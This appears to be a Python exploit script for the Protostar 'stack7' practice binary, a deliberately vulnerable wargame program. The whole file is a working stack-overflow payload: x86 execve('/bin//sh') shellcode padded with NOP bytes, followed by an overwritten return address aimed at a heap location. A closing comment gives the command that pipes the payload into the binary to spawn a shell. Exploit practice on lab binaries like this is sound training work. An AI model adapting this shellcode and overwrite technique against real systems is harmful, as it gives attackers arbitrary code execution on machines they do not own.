import struct
import sys

offset_shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'.ljust(80, '\x90')
shellcode_heap_addr = struct.pack('<I', 0x804a008)

sys.stdout.write(offset_shellcode + shellcode_heap_addr)


# (python /home/user/exploit.py ; cat) | /opt/protostar/bin/stack7
